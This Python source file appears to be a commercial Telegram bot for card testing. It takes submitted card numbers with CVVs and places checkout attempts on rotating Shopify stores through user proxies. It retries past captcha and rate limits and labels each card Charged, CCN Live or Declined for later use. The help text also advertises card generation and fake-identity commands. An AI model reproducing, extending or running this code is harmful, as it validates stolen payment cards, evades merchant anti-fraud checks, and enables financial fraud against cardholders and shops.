"""
Professional Shopify Single Card Checker
Handles /sh and /slf commands for checking cards on user's saved site.
Uses site rotation for retry logic on captcha/errors.
"""

import re
import json
import os
import asyncio
from time import time
from datetime import datetime

from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ParseMode, ChatType

from BOT.helper.start import load_users
from BOT.helper.antispam import can_run_command
from BOT.gc.credit import has_credits, deduct_credit
from BOT.Charge.Shopify.slf.api import autoshopify
from BOT.Charge.Shopify.tls_session import TLSAsyncSession
from BOT.Charge.Shopify.slf.site_manager import SiteRotator, get_user_sites, get_primary_site

# Try to import BIN lookup
try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return None

# Maximum retries with site rotation
MAX_SITE_RETRIES = 5


def extract_card(text: str):
    """Extract card details from text in format cc|mm|yy|cvv."""
    match = re.search(r'(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', text)
    if match:
        return match.groups()
    return None


def determine_status(response: str) -> tuple:
    """
    Determine status category from response.
    Returns (status_text, header, is_live)
    
    Categories:
    - CHARGED: Payment went through successfully
    - CCN LIVE: Card is valid but CVV/Address/3DS issue (can be used with correct CVV)
    - DECLINED: Card is dead/blocked/expired
    - ERROR: System/Site errors, not card-related
    """
    response_upper = str(response).upper()
    
    # Charged/Success - Payment completed
    if any(x in response_upper for x in [
        "ORDER_PLACED", "ORDER_CONFIRMED", "THANK_YOU", "SUCCESS", "CHARGED", 
        "PAYMENT_RECEIVED", "COMPLETE"
    ]):
        return "Charged 💎", "CHARGED", True
    
    # Site/System Errors - These are NOT card issues, retry with different site or later
    if any(x in response_upper for x in [
        # Captcha/Bot detection
        "CAPTCHA", "HCAPTCHA", "RECAPTCHA", "CHALLENGE", "VERIFY",
        # Site errors
        "SITE_EMPTY", "SITE_HTML", "SITE_CAPTCHA", "SITE_HTTP", "SITE_CONNECTION",
        "SITE_NO_PRODUCTS", "SITE_PRODUCTS_EMPTY", "SITE_INVALID_JSON", "SITE_EMPTY_JSON",
        # Cart/Session errors
        "CART_ERROR", "CART_HTML", "CART_INVALID", "CART_CREATION",
        "SESSION_ERROR", "SESSION_ID", "SESSION_INVALID",
        # Other system errors
        "ERROR", "TIMEOUT", "EMPTY", "DEAD", "CONNECTION", "RATE_LIMIT",
        "BLOCKED", "PROXY", "NO_AVAILABLE_PRODUCTS", "BUILD",
        # Tax and delivery issues
        "TAX_ERROR", "DELIVERY_ERROR", "SHIPPING_ERROR"
    ]):
        return "Error ⚠️", "ERROR", False
    
    # CCN/Live (CVV/Address issues but card NUMBER is valid)
    # These indicate the card exists and is active, just wrong CVV/address
    if any(x in response_upper for x in [
        "3DS", "3D_SECURE", "AUTHENTICATION_REQUIRED", "INCORRECT_CVC", "INVALID_CVC", 
        "INCORRECT_ADDRESS", "INCORRECT_ZIP", "INCORRECT_PIN", "MISMATCHED_BILLING",
        "MISMATCHED_ZIP", "MISMATCHED_PIN", "MISMATCHED_BILL", "CVV_MISMATCH",
        "INSUFFICIENT_FUNDS"  # Card is valid but no funds
    ]):
        return "Approved ✅", "CCN LIVE", True
    
    # Declined - Card is dead/blocked/stolen/expired/invalid
    if any(x in response_upper for x in [
        "CARD_DECLINED", "DECLINED", "GENERIC_DECLINE", "DO_NOT_HONOR",
        "INCORRECT_NUMBER", "INVALID_NUMBER", "EXPIRED", "NOT_SUPPORTED", 
        "LOST", "STOLEN", "PICKUP", "RESTRICTED", "SECURITY_VIOLATION",
        "FRAUD", "FRAUDULENT", "INVALID_ACCOUNT", "CARD_NOT_SUPPORTED",
        "TRY_AGAIN", "PROCESSING_ERROR", "NO_SUCH_CARD", "LIMIT_EXCEEDED",
        "REVOKED", "SERVICE_NOT_ALLOWED"
    ]):
        return "Declined ❌", "DECLINED", False
    
    # Default to declined for unknown responses
    return "Declined ❌", "RESULT", False


def format_response(fullcc: str, result: dict, user_info: dict, time_taken: float, retry_count: int = 0, has_proxy: bool = False) -> str:
    """Format the checkout response in the original professional style."""
    parts = fullcc.split("|")
    cc = parts[0] if len(parts) > 0 else "Unknown"
    
    response = result.get("Response", "UNKNOWN")
    gateway = result.get("Gateway", "Unknown")
    price = result.get("Price", "0.00")
    receipt_id = result.get("ReceiptId", None)  # Get receipt ID if present
    
    status_text, header, is_live = determine_status(response)
    
    # BIN lookup
    bin_data = get_bin_details(cc[:6]) if get_bin_details else None
    
    if bin_data:
        bin_number = bin_data.get('bin', cc[:6])
        vendor = bin_data.get('vendor', 'N/A')
        card_type = bin_data.get('type', 'N/A')
        level = bin_data.get('level', 'N/A')
        bank = bin_data.get('bank', 'N/A')
        country = bin_data.get('country', 'N/A')
        country_flag = bin_data.get('flag', '🏳️')
    else:
        bin_number = cc[:6]
        vendor = "N/A"
        card_type = "N/A"
        level = "N/A"
        bank = "N/A"
        country = "N/A"
        country_flag = "🏳️"
    
    # Build optional lines
    bill_line = ""
    if receipt_id:
        bill_line = f"\n<b>[•] Bill:</b> <code>{receipt_id}</code>"
    
    retry_line = f"\n<b>[•] Retries:</b> <code>{retry_count}</code>" if retry_count > 0 else ""
    
    proxy_status = "Live ⚡️" if has_proxy else "None"
    
    # Build message in original format
    return f"""<b>[#Shopify] | {header}</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card:</b> <code>{fullcc}</code>
<b>[•] Gateway:</b> <code>Shopify {gateway} ${price}</code>
<b>[•] Status:</b> <code>{status_text}</code>
<b>[•] Response:</b> <code>{response}</code>{retry_line}{bill_line}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] BIN:</b> <code>{bin_number}</code>
<b>[+] Info:</b> <code>{vendor} - {card_type} - {level}</code>
<b>[+] Bank:</b> <code>{bank}</code> 🏦
<b>[+] Country:</b> <code>{country}</code> {country_flag}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By:</b> {user_info['profile']} [<code>{user_info['plan']} {user_info['badge']}</code>]
<b>[ϟ] Dev:</b> <a href="https://t.me/Chr1shtopher">Chr1shtopher</a>
━━━━━━━━━━━━━━━
<b>[ﾒ] Time:</b> <code>{time_taken}s</code> | <b>Proxy:</b> <code>{proxy_status}</code>"""


async def check_group_command(message: Message) -> bool:
    """
    Check if command is used in group and guide user to use in private.
    Returns True if command should continue, False if it was blocked.
    """
    if message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
        # Extract command name
        command = message.text.split()[0].replace("/", "").replace(".", "").replace("$", "").lower()
        
        if command in PRIVATE_ONLY_COMMANDS:
            # Get bot username for link
            try:
                bot_info = await message._client.get_me()
                bot_username = bot_info.username
                bot_link = f"https://t.me/{bot_username}"
            except:
                bot_link = "https://t.me/YOUR_BOT"
            
            await message.reply(
                f"""<pre>🔒 Private Command</pre>
━━━━━━━━━━━━━━━
<b>This command only works in private chat.</b>

<b>How to use:</b>
1️⃣ Click the button below to open private chat
2️⃣ Use <code>/{command}</code> command there

<b>Why private?</b>
• 🔐 Protects your card data
• ⚡ Faster response times
• 📊 Personal site management
━━━━━━━━━━━━━━━
<i>Your data security is our priority!</i>""",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📱 Open Private Chat", url=bot_link)],
                    [InlineKeyboardButton("📖 Help", callback_data="show_help")]
                ])
            )
            return False
    return True


@Client.on_message(filters.command(["sh", "slf"]) | filters.regex(r"^\.sh(\s|$)") | filters.regex(r"^\.slf(\s|$)"))
async def handle_sh_command(client: Client, message: Message):
    """
    Handle /sh and /slf commands for Shopify card checking.
    Uses site rotation for retry logic on captcha/errors.
    """
    try:
        if not message.from_user:
            return
        
        user_id = str(message.from_user.id)
        users = load_users()
        
        # Check registration
        if user_id not in users:
            return await message.reply(
                """<pre>Access Denied 🚫</pre>
<b>You must register first using</b> <code>/register</code> <b>command.</b>""",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
        
        # Check credits
        if not has_credits(user_id):
            return await message.reply(
                """<pre>Notification ❗️</pre>
<b>Message:</b> <code>You Have Insufficient Credits</code>
━━━━━━━━━━━━━
<b>Type <code>/buy</code> to get Credits.</b>""",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
        
        # Initialize site rotator
        rotator = SiteRotator(user_id, max_retries=MAX_SITE_RETRIES)
        
        if not rotator.has_sites():
            return await message.reply(
                """<pre>Site Not Found ⚠️</pre>
<b>Error:</b> <code>Please set a site first</code>

Use <code>/addurl https://store.com</code> to add a Shopify site.
Use <code>/txturl site1.com site2.com</code> for multiple sites.""",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
        
        # Extract card
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            return await message.reply(
                """<pre>Card Not Found ❌</pre>
<b>Error:</b> <code>No card found in your input</code>

<b>Usage:</b> <code>/sh cc|mm|yy|cvv</code>
<b>Example:</b> <code>/sh 4111111111111111|12|2025|123</code>""",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
        
        extracted = extract_card(target_text)
        if not extracted:
            return await message.reply(
                """<pre>Invalid Format ❌</pre>
<b>Error:</b> <code>Card format is incorrect</code>

<b>Format:</b> <code>cc|mm|yy|cvv</code> or <code>cc|mm|yyyy|cvv</code>
<b>Example:</b> <code>/sh 4111111111111111|12|25|123</code>""",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
        
        # Antispam check
        allowed, wait_time = can_run_command(user_id, users)
        if not allowed:
            return await message.reply(
                f"""<pre>Antispam Detected ⚠️</pre>
<b>Message:</b> <code>Please wait before checking again</code>
<b>Try again in:</b> <code>{wait_time}s</code>""",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
        
        # Prepare card
        card_num, mm, yy, cvv = extracted
        fullcc = f"{card_num}|{mm}|{yy}|{cvv}"
        
        # Get user info
        user_data = users.get(user_id, {})
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎟️")
        profile = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
        
        user_info = {"profile": profile, "plan": plan, "badge": badge}
        
        start_time = time()
        
        # Get user's proxy - REQUIRED for Shopify checks
        try:
            from BOT.tools.proxy import get_proxy
            user_proxy = get_proxy(int(user_id))
        except:
            user_proxy = None
        
        # Check if proxy is configured - REQUIRED
        if not user_proxy:
            return await message.reply(
                """<pre>Proxy Required 🔐</pre>
━━━━━━━━━━━━━━━
<b>You haven't configured a proxy yet.</b>

<b>Proxy is required for:</b>
• Avoiding rate limits
• Better success rates
• Secure checking

<b>How to set up:</b>
<code>/setpx ip:port:user:pass</code>

<b>Example:</b>
<code>/setpx 192.168.1.1:8080:user:pass</code>
━━━━━━━━━━━━━━━
<i>Set your proxy in private chat first!</i>""",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
        
        has_proxy = True
        
        # Loading animation frames
        loading_frames = ["◐", "◓", "◑", "◒"]
        
        # Get initial site
        current_site = rotator.get_current_site()
        site_url = current_site.get("url")
        gate = current_site.get("gateway", "Shopify")
        
        # Show processing message
        loading_msg = await message.reply(
            f"""<pre>Processing Request...</pre>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>• Card:</b> <code>{fullcc}</code>
<b>• Gate:</b> <code>{gate}</code>
<b>• Sites:</b> <code>{rotator.get_site_count()}</code>
<b>• Status:</b> <i>Checking... {loading_frames[0]}</i>
<b>• Retries:</b> <code>0</code>""",
            reply_to_message_id=message.id,
            parse_mode=ParseMode.HTML
        )
        
        # Site rotation with retry logic
        result = None
        retry_count = 0
        frame_idx = 0
        sites_tried = 0
        
        while retry_count < MAX_SITE_RETRIES:
            try:
                # Update loading animation
                frame_idx = (frame_idx + 1) % len(loading_frames)
                sites_tried += 1
                
                # Get current site for this attempt
                current_site = rotator.get_current_site()
                if not current_site:
                    break
                
                site_url = current_site.get("url")
                gate = current_site.get("gateway", "Shopify")
                
                try:
                    await loading_msg.edit(
                        f"""<pre>Processing Request...</pre>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>• Card:</b> <code>{fullcc}</code>
<b>• Site:</b> <code>{site_url[:30]}...</code>
<b>• Gate:</b> <code>{gate}</code>
<b>• Status:</b> <i>Checking... {loading_frames[frame_idx]}</i>
<b>• Retries:</b> <code>{retry_count}</code> | Sites: <code>{sites_tried}/{rotator.get_site_count()}</code>""",
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
                
                async with TLSAsyncSession(timeout_seconds=120, proxy=user_proxy) as session:
                    result = await autoshopify(site_url, fullcc, session)
                
                response = str(result.get("Response", ""))
                
                # Check if this is a real response (not captcha/site error)
                if rotator.is_real_response(response):
                    # Mark site as successful and exit loop
                    rotator.mark_current_success()
                    break
                
                # Check if we should retry with another site
                if rotator.should_retry(response):
                    retry_count += 1
                    rotator.mark_current_failed()
                    
                    # Get next site
                    next_site = rotator.get_next_site()
                    if next_site and retry_count < MAX_SITE_RETRIES:
                        try:
                            await loading_msg.edit(
                                f"""<pre>Rotating Site - Retrying...</pre>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>• Card:</b> <code>{fullcc}</code>
<b>• Response:</b> <code>{response[:30]}...</code>
<b>• Status:</b> <i>Switching site... {loading_frames[frame_idx]}</i>
<b>• Retries:</b> <code>{retry_count}/{MAX_SITE_RETRIES}</code>""",
                                parse_mode=ParseMode.HTML
                            )
                        except:
                            pass
                        await asyncio.sleep(1.5)
                        continue
                    else:
                        # No more sites or max retries reached
                        break
                else:
                    # Not a retry-worthy response, just break
                    break
                
            except Exception as e:
                result = {
                    "Response": f"ERROR: {str(e)[:60]}",
                    "Status": False,
                    "Gateway": gate,
                    "Price": "0.00",
                    "cc": fullcc
                }
                retry_count += 1
                next_site = rotator.get_next_site()
                if not next_site or retry_count >= MAX_SITE_RETRIES:
                    break
                await asyncio.sleep(1)
        
        if result is None:
            result = {
                "Response": "ERROR: ALL_SITES_FAILED",
                "Status": False,
                "Gateway": "Unknown",
                "Price": "0.00",
                "cc": fullcc
            }
        
        time_taken = round(time() - start_time, 2)
        
        # Format response with retry count
        final_message = format_response(fullcc, result, user_info, time_taken, retry_count, has_proxy)
        
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Support", url="https://t.me/Chr1shtopher"),
                InlineKeyboardButton("Plans", callback_data="plans_info")
            ]
        ])
        
        await loading_msg.edit(
            final_message,
            reply_markup=buttons,
            disable_web_page_preview=True,
            parse_mode=ParseMode.HTML
        )
        
        # Deduct credit
        success, msg = deduct_credit(user_id)
        if not success:
            print(f"Credit deduction failed for user {user_id}")
        
    except Exception as e:
        print(f"Error in /sh command: {e}")
        import traceback
        traceback.print_exc()
        try:
            await message.reply(
                f"<pre>Error Occurred ⚠️</pre>\n<code>{str(e)[:100]}</code>",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
        except:
            pass


# Callback handlers for buttons
@Client.on_callback_query(filters.regex("^help_addurl$"))
async def help_addurl_callback(client, callback_query):
    """Show help for adding URL."""
    await callback_query.answer()
    await callback_query.message.reply(
        """<pre>📖 How to Add Shopify Site</pre>
━━━━━━━━━━━━━━━
<b>Step 1:</b> Find a Shopify store URL
<b>Step 2:</b> Use the command:

<code>/addurl https://store.myshopify.com</code>

<b>The bot will:</b>
• ✅ Validate the site
• ✅ Find cheapest product
• ✅ Detect payment gateway
• ✅ Save it for your checks

<b>After adding, use:</b>
<code>/sh cc|mm|yy|cvv</code>
━━━━━━━━━━━━━━━""",
        parse_mode=ParseMode.HTML
    )


@Client.on_callback_query(filters.regex("^show_help$"))
async def show_help_callback(client, callback_query):
    """Show general help."""
    await callback_query.answer("Opening help menu...")
    await callback_query.message.reply(
        """<pre>📖 Bot Commands Help</pre>
━━━━━━━━━━━━━━━
<b>Shopify Commands:</b>
• <code>/addurl</code> - Add Shopify site
• <code>/mysite</code> - View your site
• <code>/sh</code> - Check card on your site
• <code>/msh</code> - Mass check cards

<b>Stripe Commands:</b>
• <code>/st</code> - Stripe $20 charge
• <code>/au</code> - Stripe auth check

<b>Other Commands:</b>
• <code>/bin</code> - BIN lookup
• <code>/fake</code> - Generate fake info
• <code>/gen</code> - Generate cards
━━━━━━━━━━━━━━━""",
        parse_mode=ParseMode.HTML
    )


@Client.on_callback_query(filters.regex("^charged_info$"))
async def charged_info_callback(client, callback_query):
    """Show info about charged card."""
    await callback_query.answer(
        "💎 Card was successfully charged! The payment went through.",
        show_alert=True
    )


@Client.on_callback_query(filters.regex("^ccn_info$"))
async def ccn_info_callback(client, callback_query):
    """Show info about CCN live card."""
    await callback_query.answer(
        "✅ Card is LIVE! CVV/Address issue but card number is valid.",
        show_alert=True
    )


@Client.on_callback_query(filters.regex("^try_another$"))
async def try_another_callback(client, callback_query):
    """Show how to try another card."""
    await callback_query.answer(
        "Use /sh cc|mm|yy|cvv with a different card",
        show_alert=True
    )
